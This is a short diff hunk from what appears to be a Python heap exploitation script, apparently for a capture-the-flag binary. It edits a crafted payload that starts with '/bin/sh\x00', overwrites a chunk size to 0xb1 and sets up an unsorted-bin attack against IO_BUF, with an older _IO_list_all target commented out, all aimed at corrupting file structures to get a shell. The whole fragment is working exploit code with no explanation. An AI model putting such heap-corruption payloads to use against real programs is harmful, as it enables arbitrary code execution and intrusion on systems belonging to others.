@@ -184,7 +184,7 @@ free(0)
 alloc(p64(heap_base + 0xb0) * 10, 9)      # first
 alloc(p64(0x61) * 10, 9)
 alloc(p64(0x61) * 10, 9)
-exp3 = "/bin/sh\x00" + p64(0x61)
+exp3 = "/bin/sh\x00" + p64(0xb1)        # size overwrite
 #exp3 += p64(0xdeadbeefc0dec0de) + p64(_IO_list_all - 0x10)      # unsorted bin
 exp3 += p64(0xddaa) + p64(IO_BUF - 0x10)      # unsorted bin
 exp3 += p64(0) * 6
